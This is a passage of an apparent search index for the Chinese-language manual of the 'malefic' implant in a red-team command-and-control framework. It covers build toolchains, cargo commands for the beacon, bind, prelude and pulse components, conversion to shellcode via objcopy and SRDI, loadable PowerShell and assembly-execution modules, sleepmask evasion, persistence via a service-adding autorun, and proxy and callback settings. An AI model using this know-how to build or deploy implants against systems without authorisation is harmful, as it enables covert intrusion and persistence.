x86_64-unknown-linux-musl\n</code></pre> <p>linux\u73af\u5883\u914d\u7f6e</p> <pre><code>sudo apt install -y openssl libssl-dev libudev-dev cmake llvm clang musl-tools build-essential\n</code></pre> <p>windows\u73af\u5883\u914d\u7f6e</p> windows \u914d\u7f6emsvc\u73af\u5883(\u4f7f\u7528x86_64-pc-windows-msvc\u5fc5\u987b) <p>\u8bf7\u53c2\u8003: https://rust-lang.github.io/rustup/installation/windows-msvc.html</p> windows \u914d\u7f6e gnu \u73af\u5883(\u5982\u679c\u4f7f\u7528x86_64-pc-windows-gnu\u5fc5\u987b) <p>\u672c\u5730\u624b\u52a8\u7f16\u8bd1\u65f6\uff0c\u6211\u4eec\u63a8\u8350 windows \u7528\u6237\u4f7f\u7528msys2\u7ba1\u7406 GNU \u5de5\u5177\u94fe\u73af\u5883, \u53ef\u901a\u8fc7\u5b98\u7f51\u4e8c\u8fdb\u5236\u6587\u4ef6\u76f4\u63a5\u5b89\u88c5\u3002</p> <p>\u5728 msys2 \u7684 terminal \u6267\u884c\u5982\u4e0b\u5b89\u88c5\u53ef\u4ee5\u4fdd\u8bc1 64\u300132 \u4f4d GNU \u5de5\u5177\u94fe\u7684\u6b63\u5e38\u7f16\u8bd1</p> <pre><code>pacman -Syy # \u66f4\u65b0\u5305\u5217\u8868\npacman -S --needed mingw-w64-x86_64-gcc\npacman -S --needed mingw-w64-i686-gcc\n</code></pre> <p>\u4f60\u53ef\u4ee5\u628a msys64 \u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c \u6216\u901a\u8fc7<code>notepad $PROFILE</code>\u5c06\u5982\u4e0b\u5185\u5bb9\u6dfb\u52a0\u5230 powershell \u914d\u7f6e\u4e2d\uff0c\u5b9e\u73b0\u5728 powershell \u4e2d\u5feb\u901f\u5207\u6362<code>mingw64/32</code>.</p> <pre><code>function mg {\n    param (\n        [ValidateSet(\"32\", \"64\")]\n        [string]$arch = \"64\"\n    )\n\n    $basePath = \"D:\\msys64\\mingw\" # \u6b64\u5904\u662f\u4f60\u7684msys2\u5b89\u88c5\u8def\u5f84\n    $env:PATH = \"${basePath}${arch}\\bin;\" + $env:PATH\n    Write-Host \"Switched to mingw${arch} (bit) toolchain\"\n}\nmg 64\n</code></pre> <p>\u7528\u6cd5\u53c2\u8003\u4e0b\u56fe:</p> <p></p>"},{"location":"IoM/manual/implant/build/#\u7f16\u8bd1\u6b65\u9aa4","title":"\u7f16\u8bd1\u6b65\u9aa4","text":"<p>\u672c\u673a\u5b89\u88c5\u8bf7\u6ce8\u610f\u4e0b\u8f7dresources\u5e76\u89e3\u538b\u5230\u6307\u5b9a\u76ee\u5f55</p> <p>\u6b64\u90e8\u5206\u4e5f\u53ef\u4ee5\u4f7f\u7528make\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1, \u4e0e\u524d\u6587Makefile\u4e00\u81f4</p> <p>\u7f16\u8bd1 malefic</p> <p>\u9879\u76ee\u7684\u914d\u7f6e(.cargo/config.toml\u3001cargo.toml\u3001Makefile)\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u9884\u8bbe\u548c\u7f16\u8bd1\u4f18\u5316\u9009\u9879. \u719f\u6089 rust \u7684\u4f7f\u7528\u8005\u4e5f\u53ef\u4ee5\u624b\u52a8\u7f16\u8bd1\uff0cmalefic \u76ee\u524d\u4f7f\u7528\u7684 rust \u7248\u672c\u662f<code>nightly-2023-09-18</code>.</p> <p>\u5728\u8fdb\u884c\u624b\u52a8\u7f16\u8bd1\u524d\uff0c \u8bf7\u66f4\u6539 <code>beacon/bind</code> \u5bf9\u5e94\u7684\u914d\u7f6e\u9879, \u5173\u4e8e\u914d\u7f6e\u9879\uff0c \u8bf7\u53c2\u8003 \u914d\u7f6e\u8bf4\u660e</p> <p>\u6dfb\u52a0\u5bf9\u5e94\u7684\u76ee\u6807\u7f16\u8bd1\u67b6\u6784,\u4ee5<code>x86_64-pc-windows-gnu</code>\u4e3a\u4f8b</p> <pre><code>rustup target add x86_64-pc-windows-gnu\n</code></pre> <p>\u751f\u6210\u914d\u7f6e\u4e0e\u4ee3\u7801</p> <p>\u7f16\u8bd1mutant, \u6216\u4ecemalefic release\u4e2d\u4e0b\u8f7d\u7f16\u8bd1\u597d\u7684mutant,mutant \u5b8c\u6574\u6587\u6863</p> <pre><code>cargo build --release -p malefic-mutant\n</code></pre> <p>\u901a\u8fc7 mutant \u751f\u6210\u5bf9\u5e94\u7684\u914d\u7f6e</p> <pre><code># \u751f\u6210 beacon \u7f16\u8bd1\u6240\u9700\u7684\u914d\u7f6e\u548c\u4ee3\u7801\n./target/release/malefic-mutant generate beacon\n# \u751f\u6210 bind \u7f16\u8bd1\u6240\u9700\u7684\u914d\u7f6e\u548c\u4ee3\u7801\n./target/release/malefic-mutant generate bind\n</code></pre> <p>\u6307\u5b9a <code>target</code> \u7f16\u8bd1</p> <pre><code># mg 64\ncargo build --release -p malefic --target x86_64-pc-windows-gnu\n# mg 32\ncargo build --release -p malefic --target i686-pc-windows-gnu\n\n# \u5982\u679c\u4f60\u9700\u8981\u7f16\u8bd1win7\u7684target,\u8bf7\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\ncargo +nightly build --release -p malefic --target x86_64-win7-windows-msvc -Z build-std=std,panic_abort\n</code></pre> <p>\u7f16\u8bd1 malefic-prelude</p> <p>\u751f\u6210\u914d\u7f6e</p> <pre><code>malefic-mutant generate prelude autorun.yaml\n</code></pre> <pre><code>cargo build --release -p malefic-prelude --target x86_64-pc-windows-gnu\n</code></pre> <p>\u7f16\u8bd1 malefic-pulse</p> <p>\u5728\u8fdb\u884c\u624b\u52a8\u7f16\u8bd1\u524d\uff0c \u8bf7\u66f4\u6539 <code>pulse</code> \u5bf9\u5e94\u7684\u914d\u7f6e\u9879, \u5173\u4e8e\u914d\u7f6e\u9879\uff0c \u8bf7\u53c2\u8003 pulse \u914d\u7f6e\u8bf4\u660e</p> <pre><code>malefic-mutant generate pulse\n</code></pre> <p>\u6307\u5b9a <code>target</code> \u7f16\u8bd1</p> <pre><code># mg 64\ncargo build -p malefic-pulse --target x86_64-pc-windows-gnu\n# mg 32\ncargo build -p malefic-pulse --target i686-pc-windows-gnu\n</code></pre> <p>\u751f\u6210\u5bf9\u5e94\u7684 <code>malefic-pulse.exe</code> \u6587\u4ef6\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 <code>objcopy</code> \u6765\u8fdb\u884c <code>shellcode</code> \u7684\u8f6c\u5316</p> <pre><code>objcopy -O binary malefic-pulse.exe malefic-pulse.bin\n</code></pre> <p>\u7f16\u8bd1\u72ec\u7acb modules</p> <p>malefic \u7684 windows \u5e73\u53f0\u76ee\u524d\u652f\u6301\u52a8\u6001\u52a0\u8f7d module, \u56e0\u6b64\u53ef\u4ee5\u7f16\u8bd1\u5355\u4e2a\u6216\u8005\u4e00\u7ec4 module, \u7136\u540e\u901a\u8fc7<code>load_module</code>\u7ed9\u5df2\u4e0a\u7ebf\u7684 implant \u6dfb\u52a0\u65b0\u7684\u529f\u80fd.</p> <p>\u76f8\u5173\u547d\u4ee4\u5982\u4e0b:</p> <p>\u751f\u6210\u5bf9\u5e94\u914d\u7f6e</p> <pre><code>malefic_mutant generate modules \"execute_powershell execute_assembly\"\n</code></pre> <p>\u7f16\u8bd1 modules</p> <pre><code>malefic_mutant build modules --target x86_64-pc-windows-gnu\n</code></pre> <p>\u5f53\u524d\u652f\u6301\u7684 modules</p> <p>\u8bf7\u89c1: https://chainreactors.github.io/wiki/IoM/manual/implant/modules/#modules</p> <p>\u7f16\u8bd1\u7ed3\u679c\u4e3a<code>target\\[arch]\\release\\modules.dll</code></p> <p>\u53ef\u4ee5\u4f7f\u7528<code>load_module</code>\u70ed\u52a0\u8f7d\u8fd9\u4e2a dll</p> <p>module \u52a8\u6001\u52a0\u8f7d\u76ee\u524d\u53ea\u652f\u6301 windows</p> <p>linux \u4e0e mac \u5728\u7406\u8bba\u4e0a\u4e5f\u53ef\u4ee5\u5b9e\u73b0, \u5c06\u4f1a\u968f\u7740\u5bf9\u5e94\u7684kit\u53d1\u5e03</p> <p>\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u666f:</p> <ol> <li>\u7f16\u8bd1\u4e00\u4e2a\u4e0d\u5e26\u4efb\u4f55 modules \u7684 malefic, \u4fdd\u6301\u9759\u6001\u6587\u4ef6\u6700\u5c0f\u7279\u5f81\u4e0e\u6700\u5c0f\u4f53\u79ef. \u901a\u8fc7<code>load_module modules.dll</code> \u52a8\u6001\u52a0\u8f7d\u6a21\u5757</li> <li>\u6839\u636e\u573a\u666f\u5feb\u901f\u5f00\u53d1 module, \u7136\u540e\u52a8\u6001\u52a0\u8f7d\u5230 malefic \u4e2d.</li> <li>\u957f\u65f6\u95f4\u4fdd\u6301\u9759\u9ed8\u7684\u573a\u666f\u53ef\u4ee5\u5378\u8f7d\u6240\u6709\u7684 modules, \u5e76\u8fdb\u5165\u5230 sleepmask \u7684\u5806\u52a0\u5bc6\u72b6\u6001. \u7b49\u9700\u8981\u64cd\u4f5c\u65f6\u91cd\u65b0\u52a0\u8f7d modules</li> </ol>"},{"location":"IoM/manual/implant/build/#\u7b2c\u4e09\u90e8\u5206mutant-\u5de5\u5177","title":"\u7b2c\u4e09\u90e8\u5206\uff1aMutant \u5de5\u5177","text":"<p>malefic \u5728v0.0.3\u4e2d\u89e3\u8026\u4e3a\u591a\u4e2a\u7ec4\u4ef6\u5e76\u65b0\u589e\u4e86\u5927\u91cf\u7ec4\u4ef6\uff0c\u53ef\u9884\u89c1\u7684\u5c06\u4f1a\u6709\u66f4\u591a\u7ec4\u4ef6\u548c\u6a21\u5757\u51fa\u73b0\u5728\u9879\u76ee\u4e2d\uff0c \u56e0\u6b64\u914d\u7f6e\u751f\u6210/\u7ba1\u7406\u5de5\u5177\u523b\u4e0d\u5bb9\u7f13\uff0c \u4e4b\u524d\u7684 config \u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u5f53\u524d\u7684\u9700\u6c42\uff0c \u6211\u4eec\u65b0\u589e\u4e86 malefic-mutant \u4ee3\u66ff\u539f\u6709\u7684malefic-config\u3002</p> <p>\u5728\u8bbe\u8ba1\u4e2d\uff0c mutant \u7684\u5b9a\u4f4d\u76f8\u5f53\u4e8e MSF venom\uff0c \u53ef\u4ee5\u52a8\u6001\u89e3\u6790\u548c\u66f4\u6539\u914d\u7f6e\u4ee5\u52a8\u6001\u751f\u6210\u4ee3\u7801\uff0c \u4e5f\u53ef\u4ee5\u901a\u8fc7\u9700\u6c42\u52a8\u6001\u751f\u6210 shellcode \u7684 raw \u6587\u4ef6.</p>"},{"location":"IoM/manual/implant/build/#31-installbuild","title":"3.1 Install/Build","text":"<p>malefic-mutant \u4f1a\u968f\u7740\u6bcf\u4e2a\u7248\u672c\u81ea\u52a8\u7f16\u8bd1\u5bf9\u5e94\u7684release. \u76f4\u63a5\u4e0b\u8f7d\u5373\u53ef\u4f7f\u7528</p> <p>https://github.com/chainreactors/malefic/releases/latest</p> <p>\u4e5f\u652f\u6301\u4ece\u6e90\u7801\u7f16\u8bd1:</p> <pre><code>cargo build --release -p malefic-mutant \n</code></pre> <p>\u7f16\u8bd1\u73af\u5883</p> <p>\u7f16\u8bd1\u73af\u5883\u53ef\u4ee5\u53c2\u8003build\u4e2d\u5bf9\u5e94\u7684\u914d\u7f6e\u6d41\u7a0b</p>"},{"location":"IoM/manual/implant/build/#32-config","title":"3.2 Config","text":"<p>malefic-mutant \u76ee\u524d\u6709\u4e09\u5927\u7ec4\u4ef6:</p> <ul> <li>generate\uff1a \u6839\u636e\u914d\u7f6e\u52a8\u6001\u751f\u6210\u4ee3\u7801</li> <li>build\uff1a\u521b\u5efa\u53ef\u7528\u7684 shellcode/PE \u6587\u4ef6\u548c\u7f16\u8bd1</li> <li>tool: \u4e00\u4e9b\u53ef\u7528\u7684\u5c0f\u5de5\u5177\uff08\u76ee\u524d\u4e3asrdi\uff09</li> </ul> <p>\u5176\u4e2d generate \u6240\u4f9d\u8d56\u7684\u914d\u7f6e\u5747\u5728 malefic/config.yaml \u6587\u4ef6\u4e2d</p> <pre><code>$ mutant --help\nConfig malefic beacon and prelude.\n\nUsage: malefic-mutant.exe &lt;COMMAND&gt;\n\nCommands:\n  generate  auto generate config\n  build     auto build\n  tool\n  help      Print this message or the help of the given subcommand(s)\n\nOptions:\n  -h, --help  Print help\n</code></pre> <p>\u7531\u4e8e beacon \u662f\u6574\u4e2a\u529f\u80fd\u7684\u7ed3\u5408\u5f62\u6001\uff0c \u56e0\u6b64\u914d\u7f6e\u9879\u7565\u5fae\u590d\u6742\uff0c \u8fd9\u91cc\u5c06\u5176\u5206\u4e3a\u4e09\u90e8\u5206\u6765\u4ecb\u7ecd</p> <p>\u914d\u7f6e\u6587\u4ef6\u6a21\u677f: https://github.com/chainreactors/malefic/blob/master/config.yaml</p>"},{"location":"IoM/manual/implant/build/#33-generate","title":"3.3 generate","text":"<p>generate\u662f\u4ee3\u7801, \u914d\u7f6e, \u7f16\u8bd1\u6761\u4ef6\u7684\u751f\u6210\u5668, \u56e0\u6b64\u9700\u8981\u5728\u6e90\u4ee3\u7801\u76ee\u5f55\u4e0b\u4f7f\u7528.</p> <p>\u5982\u679c\u8fd8\u6ca1\u6709\u4e0b\u8f7d\u5bf9\u5e94\u7684\u6e90\u4ee3\u7801, \u8bf7\u5148\u5c1d\u8bd5clone malefic.</p> <pre><code>git clone --recurse-submodules https://github.com/chainreactors/malefic\n</code></pre> <p>generate \u6a21\u5757\u5c06\u4f1a\u6839\u636e\u914d\u7f6e\u52a8\u6001\u751f\u6210\u4e00\u5207\u6240\u9700\u7684\u4ee3\u7801\uff08pulse, prelude, beacon...\uff09</p> <p>\u5728\u6bcf\u6b21\u4fee\u6539\u5b8cimplant\u7684<code>config.yaml</code>\u540e\uff0c \u90fd\u9700\u8981\u91cd\u65b0\u6267\u884c <code>malefic-mutant generate  ...</code> \u751f\u6210\u5bf9\u5e94\u7684\u914d\u7f6e</p>"},{"location":"IoM/manual/implant/build/#beacon","title":"beacon","text":"<pre><code>Usage: malefic-mutant.exe generate beacon [OPTIONS]\n\nOptions:\n  -v, --version &lt;VERSION&gt;  Choice professional or community [default: community] [possible values: community, professional, inner]\n  -s, --source             enable build from source code\n  -c, --config &lt;CONFIG&gt;    Config file path [default: config.yaml]\n  -h, --help               Print help\n</code></pre> <p>\u4f7f\u7528\u793a\u4f8b</p> <pre><code>malefic-mutant generate beacon \n</code></pre>"},{"location":"IoM/manual/implant/build/#beacon-prelude","title":"beacon prelude","text":"<p>beacon\u5728v0.1.0\u4e2d\u4e5f\u652f\u6301autorun\u4e86\u3002 \u4e0d\u5728\u9700\u8981\u5206\u9636\u6bb5\u4e0a\u7ebf\uff0c \u53ef\u4ee5\u901a\u8fc7stageless\u5b9e\u73b0\u540c\u6837\u7684\u529f\u80fd\u3002 </p> <p>\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u7f16\u8bd1\u5230beacon\u4e2d\uff0c \u5728beacon\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c\u9884\u7f16\u6392\u7684\u4efb\u52a1\u3002 </p> <pre><code>implants:  \n  ...\n  autorun: \"persistence.yaml\"\n</code></pre> <p>persistence.yaml: <pre><code>-\n  name: bof\n  body: !ExecuteBinary\n    name: addservice\n    bin: !File \"addservice.o\"\n</code></pre></p>"},{"location":"IoM/manual/implant/build/#pulse","title":"pulse","text":"<p>pulse \u4f5c\u4e3a\u76ee\u524d\u7684 shellcode \u751f\u6210\u5668\uff0c \u7531 mutant \u901a\u8fc7\u89e3\u6790\u914d\u7f6e\u6765\u63d0\u4f9b\u751f\u6210\u4ee3\u7801</p>"},{"location":"IoM/manual/implant/build/#prelude","title":"prelude","text":"<p>prelude \u4e3a\u53ef\u9009\u7684\u7528\u4e8e\u5728\u4e0a\u7ebf\u524d\u8fdb\u884c\u6743\u9650\u7ef4\u6301, \u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5\u7b49\u529f\u80fd\u7684\u4e2d\u95f4\u9636\u6bb5</p> <p>\u4f7f\u7528\u8bf4\u660e</p> <pre><code>Config prelude\n\nUsage: malefic-mutant.exe generate prelude [OPTIONS] &lt;YAML_PATH&gt;\n\nArguments:\n  &lt;YAML_PATH&gt;\n\nOptions:\n  --resources &lt;RESOURCES&gt;  Custom resources dir, default \"./resources/\" [default: resources]\n  -h, --help                   Print help\n</code></pre> <p>\u8fd9\u4e2ayaml\u80fd\u88ab\u81ea\u52a8\u6253\u5305\u7f16\u8bd1\u6210<code>spite.bin</code></p> <pre><code>malefic-mutant generate prelude autorun.yaml\n\ncargo build -p malefic-prelude\n</code></pre> <p>\u80fd\u751f\u6210\u4e00\u4e2a\u81ea\u52a8\u6309\u987a\u5e8f\u6267\u884cautorun.yaml \u4e2d\u914d\u7f6e\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f.</p>"},{"location":"IoM/manual/implant/build/#bind-unstable","title":"bind (Unstable)","text":"<p>\u5728\u5f53\u524d\u5b9e\u9645\u5bf9\u6297\u4e2d, \u53d7\u5230\u7f51\u7edc\u73af\u5883\u7684\u9650\u5236, \u5f88\u5c11\u6709\u4eba\u4f7f\u7528 bind \u7c7b\u578b\u7684 webshell. \u4f46\u5728\u4e00\u4e9b\u6781\u7aef\u573a\u666f\u4e0b, \u4f8b\u5982\u4e0d\u51fa\u7f51\u7684webshell \u4e2d, \u53c8\u6216\u8005\u957f\u65f6\u95f4\u6d41\u91cf\u9759\u9ed8\u7684\u573a\u666f\u4e0b. bind \u4e5f\u8bb8\u6709\u7528\u6b66\u4e4b\u5730</p> <p>bind \u4f5c\u4e3a\u65b0\u589e\u7684\u4e34\u65f6\u89e3\u51b3\u65b9\u6848, \u4e5f\u7531 mutant \u6765\u8fdb\u884c\u8c03\u914d</p> <pre><code>Config bind\n\nUsage: malefic-mutant.exe generate bind [OPTIONS]\n\nOptions:\n  -h, --help               Print help\n</code></pre>"},{"location":"IoM/manual/implant/build/#34-build","title":"3.4 build","text":"<p>\u5728v0.1.0\u540e\uff0c \u4e3a\u4e86\u65b9\u4fbfollvm\u7684\u590d\u6742\u53c2\u6570\u914d\u7f6e\uff0c \u6211\u4eec\u6dfb\u52a0\u4e86mutant build\u547d\u4ee4\u7ec4, \u7528\u6765\u901a\u8fc7mutant\u5c01\u88c5\u590d\u6742\u7f16\u8bd1\u53c2\u6570\uff0c \u51cf\u5c11\u7528\u6237\u4fa7\u7684\u5fc3\u667a\u8d1f\u62c5\u3002</p> <p>build \u4f5c\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6\u751f\u6210\u5668\uff0c \u7528\u4e8e\u751f\u6210\u6700\u7ec8\u4ea7\u7269</p> <pre><code>auto build\n\nUsage: malefic-mutant.exe build [OPTIONS] &lt;COMMAND&gt;\n\nCommands:\n  malefic  Build beacon\n  prelude  Build prelude\n  modules  Build modules\n  pulse    Build pulse\n  help     Print this message or the help of the given subcommand(s)\n\nOptions:\n  -c, --config &lt;CONFIG&gt;  Config file path [default: config.yaml]\n  -t, --target &lt;TARGET&gt;  [default: x86_64-pc-windows-gnu]\n  -h, --help             Print help\n</code></pre>"},{"location":"IoM/manual/implant/build/#malefic","title":"malefic","text":"<p>\u7f16\u8bd1 <pre><code>Build beacon\n\nUsage: malefic-mutant.exe build malefic [OPTIONS]\n\nOptions:\n  -c, --config &lt;CONFIG&gt;  Config file path [default: config.yaml]\n  -t, --target &lt;TARGET&gt;  [default: x86_64-pc-windows-gnu]\n  -h, --help             Print help\n</code></pre></p> <p>\u793a\u4f8b</p> <pre><code>malefic-mutant.exe build malefic --target x86_64-pc-windows-msvc\n</code></pre> <p>prelude/pulse/modules\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3c</p>"},{"location":"IoM/manual/implant/build/#35-tool","title":"3.5 tool","text":"<pre><code>Usage: malefic-mutant.exe tool &lt;COMMAND&gt;\n\nCommands:\n  srdi  Generate SRDI\n  help  Print this message or the help of the given subcommand(s)\n\nOptions:\n  -h, --help  Print help\n</code></pre>"},{"location":"IoM/manual/implant/build/#srdi","title":"SRDI","text":"<p>\u4f5c\u4e3a PE2SHELLCODE \u7684\u5e38\u89c1\u89e3\u51b3\u65b9\u6848\uff0c \u8be5\u6a21\u5757\u53ef\u4ee5\u5c06\u6211\u4eec\u7684 prelude / beacon \u8f6c\u5316\u4e3a shellcode \u4ee5\u4f9b\u591a\u6bb5\u52a0\u8f7d</p> <pre><code>Generate SRDI\n\nUsage: malefic-mutant.exe tool srdi [OPTIONS]\n\nOptions:\n  -t, --type &lt;TYPE&gt;                    Srdi type: link(not support TLS)/malefic(support TLS) [default: malefic]\n  -i, --input &lt;INPUT&gt;                  Source exec path [default: ]\n  -p, --platform &lt;PLATFORM&gt;            platform, win [default: win]\n  -a, --arch &lt;ARCH&gt;                    Choice arch x86/x64 [default: x64]\n  -o, --output &lt;OUTPUT&gt;                Target shellcode path [default: malefic.bin]\n      --function-name &lt;FUNCTION_NAME&gt;  Function name [default: ]\n      --userdata-path &lt;USERDATA_PATH&gt;  User data path [default: ]\n  -h, --help                           Print help\n</code></pre> <p>\u4f7f\u7528\u793a\u4f8b\uff1a</p> <pre><code>malefic-mutant tool srdi -i ./beacon.exe\n\nmalefic-mutant tool srdi -i ./beacon.exe -a x64 -o ./beacon.bin\n\nmalefic-mutant tool srdi -i ./beacon.dll  --function-name \"main\"\n</code></pre>"},{"location":"IoM/manual/implant/build/#\u7b2c\u56db\u90e8\u5206\u690d\u5165\u4f53\u914d\u7f6e\u8be6\u89e3","title":"\u7b2c\u56db\u90e8\u5206\uff1a\u690d\u5165\u4f53\u914d\u7f6e\u8be6\u89e3","text":"<p>\u672c\u90e8\u5206\u8be6\u7ec6\u4ecb\u7ecdIoM\u690d\u5165\u4f53\u7684\u914d\u7f6e\u9009\u9879\uff0c\u6db5\u76d6\u4ece\u57fa\u7840\u901a\u4fe1\u8bbe\u7f6e\u5230\u9ad8\u7ea7\u5bf9\u6297\u6280\u672f\u7684\u5b8c\u6574\u914d\u7f6e\u6307\u5357\u3002</p>"},{"location":"IoM/manual/implant/build/#41-\u914d\u7f6e\u6587\u4ef6\u6982\u8ff0","title":"4.1 \u914d\u7f6e\u6587\u4ef6\u6982\u8ff0","text":"<p>IoM\u690d\u5165\u4f53\u914d\u7f6e\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>basic: \u57fa\u7840\u901a\u4fe1\u914d\u7f6e\uff08\u8fde\u63a5\u3001\u52a0\u5bc6\u3001\u91cd\u8bd5\u7b49\uff09</li> <li>implants: \u690d\u5165\u4f53\u9ad8\u7ea7\u914d\u7f6e\uff08\u6a21\u5757\u3001\u5bf9\u6297\u3001API\u7b49\uff09 </li> <li>build: \u7f16\u8bd1\u6784\u5efa\u914d\u7f6e\uff08\u6df7\u6dc6\u3001\u5143\u6570\u636e\u3001\u5de5\u5177\u94fe\u7b49\uff09</li> </ul>"},{"location":"IoM/manual/implant/build/#42-basic-\u57fa\u7840\u901a\u4fe1\u914d\u7f6e","title":"4.2 basic - \u57fa\u7840\u901a\u4fe1\u914d\u7f6e","text":""},{"location":"IoM/manual/implant/build/#421-\u57fa\u672c\u6807\u8bc6\u4e0e\u7f51\u7edc\u914d\u7f6e","title":"4.2.1 \u57fa\u672c\u6807\u8bc6\u4e0e\u7f51\u7edc\u914d\u7f6e","text":"<pre><code>basic:\n  name: \"malefic\"                    # \u690d\u5165\u4f53\u6807\u8bc6\u540d\u79f0\n  proxy:                             # \u4ee3\u7406\u914d\u7f6e\uff08\u53ef\u9009\uff09\n    use_env_proxy: false             # \u662f\u5426\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u4ee3\u7406\n    url: \"http://127.0.0.1:8080\"     # \u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\n  init_retry: 10                     # \u521d\u59cb\u6ce8\u518c\u6700\u5927\u91cd\u8bd5\u6b21\u6570\n  server_retry: 10                   # \u5355\u670d\u52a1\u5668\u6bcf\u8f6e\u6700\u5927\u91cd\u8bd5\u6b21\u6570  \n  global_retry: 1000000              # \u5168\u5c40\u7d2f\u8ba1\u6700\u5927\u91cd\u8bd5\u6b21\u6570\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li> <p>name: \u690d\u5165\u4f53\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u7528\u4e8e\u670d\u52a1\u7aef\u8bc6\u522b\u548c\u7ba1\u7406</p> </li> <li> <p>proxy: \u4ee3\u7406\u914d\u7f6e\u5bf9\u8c61\uff0c\u652f\u6301\u7075\u6d3b\u7684\u4ee3\u7406\u8bbe\u7f6e</p> </li> <li>use_env_proxy: \u662f\u5426\u81ea\u52a8\u8bfb\u53d6\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u4ee3\u7406\u8bbe\u7f6e\uff08\u5982 <code>HTTP_PROXY</code>\u3001<code>HTTPS_PROXY</code>\uff09<ul> <li><code>true</code>: \u4f18\u5148\u4f7f\u7528\u73af\u5883\u53d8\u91cf\uff0c\u5982 <code>http_proxy</code>\u3001<code>https_proxy</code> \u7b49</li> <li><code>false</code>: \u5ffd\u7565\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528\u624b\u52a8\u914d\u7f6e</li> </ul> </li> <li>url: \u624b\u52a8\u6307\u5b9a\u4ee3\u7406\u670d\u52a1\u5668\u5730\u5740\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff1a<ul> <li><code>http://proxy.example.com:8080</code> - HTTP\u4ee3\u7406</li> <li><code>https://proxy.example.com:8080</code> - HTTPS\u4ee3\u7406  </li> <li><code>socks5://proxy.example.com:1080</code> - SOCKS5\u4ee3\u7406</li> </ul> </li> </ul> <p>\u4ee3\u7406\u914d\u7f6e\u793a\u4f8b\uff1a</p> <ol> <li> <p>\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u4ee3\u7406\uff08\u63a8\u8350\u4f01\u4e1a\u73af\u5883\uff09\uff1a <pre><code>proxy:\n  use_env_proxy: true        # \u542f\u7528\u73af\u5883\u53d8\u91cf\u4ee3\u7406\n  url: \"\"                    # \u7a7a\u503c\u65f6\u624d\u4f7f\u7528\u73af\u5883\u53d8\u91cf\n</code></pre></p> </li> <li> <p>\u624b\u52a8\u6307\u5b9aHTTP\u4ee3\u7406\uff1a <pre><code>proxy:\n  use_env_proxy: false\n  url: \"http://proxy.company.com:8080\"\n</code></pre></p> </li> <li> <p>\u4f7f\u7528\u8ba4\u8bc1\u4ee3\u7406\uff1a <pre><code>proxy:\n  use_env_proxy: false\n  url: \"http://username:password@proxy.example.com:8080\"\n</code></pre></p> </li> <li> <p>\u4f7f\u7528SOCKS5\u4ee3\u7406\uff1a <pre><code>proxy:\n  use_env_proxy: false\n  url: \"socks5://127.0.0.1:1080\"\n</code></pre></p> </li> <li> <p>\u7981\u7528\u4ee3\u7406\uff1a <pre><code>proxy:\n  use_env_proxy: false       # \u4e0d\u4f7f\u7528\u73af\u5883\u53d8\u91cf\n  url: \"\"                    # \u7a7a\u5730\u5740\u8868\u793a\u76f4\u8fde\n</code></pre></p> </li> <li> <p>\u6df7\u5408\u914d\u7f6e\uff08\u4e3b+\u5907\u7528\uff09\uff1a <pre><code>proxy:\n  use_env_proxy: true        # \u542f\u7528\u73af\u5883\u53d8\u91cf\u4f5c\u4e3a\u5907\u9009\n  url: \"http://primary.proxy.com:8080\"  # \u4f18\u5148\u4f7f\u7528\u6b64\u4ee3\u7406\n</code></pre></p> </li> </ol> <p>\u4f18\u5148\u7ea7\u89c4\u5219\uff1a - \u4f18\u5148\u4f7f\u7528 <code>url</code> \u914d\u7f6e\uff0c\u5982\u679c <code>url</code> \u4e0d\u4e3a\u7a7a\uff0c\u76f4\u63a5\u4f7f\u7528\u8be5\u4ee3\u7406\u5730\u5740 - \u5982\u679c <code>url</code> \u4e3a\u7a7a\u4e14 <code>use_env_proxy: true</code>\uff0c\u5219\u4f7f\u7528\u73af\u5883\u53d8\u91cf\uff08\u5982 <code>HTTP_PROXY</code>\u3001<code>HTTPS_PROXY</code>\u3001<code>ALL_PROXY</code>\uff09 - \u5982\u679c\u90fd\u4e3a\u7a7a\uff0c\u5219\u76f4\u63a5\u8fde\u63a5\u76ee\u6807\u670d\u52a1\u5668</p> <p>\u5e38\u89c1\u73af\u5883\u53d8\u91cf\uff1a - <code>HTTP_PROXY</code> - HTTP\u534f\u8bae\u4ee3\u7406 - <code>HTTPS_PROXY</code> - HTTPS\u534f\u8bae\u4ee3\u7406 - <code>ALL_PROXY</code> - \u6240\u6709\u534f\u8bae\u901a\u7528\u4ee3\u7406 - <code>NO_PROXY</code> - \u4e0d\u4f7f\u7528\u4ee3\u7406\u7684\u5730\u5740\u5217\u8868</p>"},{"location":"IoM/manual/implant/build/#422-\u65f6\u5e8f\u63a7\u5236\u914d\u7f6e","title":"4.2.2 \u65f6\u5e8f\u63a7\u5236\u914d\u7f6e","text":"<pre><code>  cron: \"*/5 * * * * * *\"      # Cron \u8868\u8fbe\u5f0f\uff1a\u6bcf5\u79d2\u56de\u8fde\u4e00\u6b21\n  jitter: 0.2                  # \u65f6\u95f4\u6296\u52a8\u7cfb\u6570\uff0820%\u968f\u673a\u504f\u79fb\uff09\n</code></pre> <p>\u5b57\u6bb5\u8bf4\u660e\uff1a</p> <ul> <li>cron: \u4f7f\u7528 Cron 